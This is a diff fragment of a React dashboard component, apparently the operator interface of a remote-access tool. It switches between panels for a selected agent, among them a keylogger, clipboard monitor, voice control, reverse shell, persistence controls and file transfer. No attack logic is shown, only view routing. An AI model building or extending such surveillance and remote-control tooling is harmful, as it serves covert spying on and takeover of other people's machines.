+          <section className="container mx-auto p-6">
+            <SystemInfoPanel agentId={selectedAgent} />
+          </section>
+        );
+      case "network":
+        return (
+          <section className="container mx-auto p-6">
+            <NetworkPanel agentId={selectedAgent} />
+          </section>
+        );
+      case "monitor-keylogger":
+        return (
+          <section className="container mx-auto p-6">
+            <KeyloggerPanel agentId={selectedAgent} />
+          </section>
+        );
+      case "monitor-clipboard":
+        return (
+          <section className="container mx-auto p-6">
+            <ClipboardMonitorPanel agentId={selectedAgent} />
+          </section>
+        );
+      case "monitor-voice":
+        return (
+          <section className="container mx-auto p-6">
+            <VoiceControlPanel agentId={selectedAgent} />
+          </section>
+        );
+      case "monitor-shell":
+        return (
+          <section className="container mx-auto p-6">
+            <ReverseShellPanel agentId={selectedAgent} />
+          </section>
+        );
+      case "webrtc-advanced":
+        return (
+          <section className="container mx-auto p-6">
+            <EnhancedWebRTCPanel agentId={selectedAgent} />
+          </section>
+        );
+      case "streaming":
+        return renderStreamingControls();
+      case "security":
+        return renderSecurityControls();
+      case "persistence":
+        return renderPersistenceControls();
+      case "monitoring":
+        return renderMonitoringControls();
+      case "files":
+        return renderFileTransfer();
+      case "files-advanced":
+        return (
+          <section className="container mx-auto p-6">
+            <EnhancedFileTransferPanel agentId={selectedAgent} />
+          </section>
+        );
+      default:
+        return renderOverviewDashboard();
+    }
+  };
+
+  return (
+    <main className="min-h-screen bg-background">
+      <Navigation
+        activeView={activeView}
+        onViewChange={setActiveView}
+        selectedAgent={selectedAgent}
+        agentCount={totalAgents}
+        onlineCount={onlineAgents.length}
+        onLogout={handleLogout}
+      />
+      {renderActiveView()}
     </main>
   );
 };
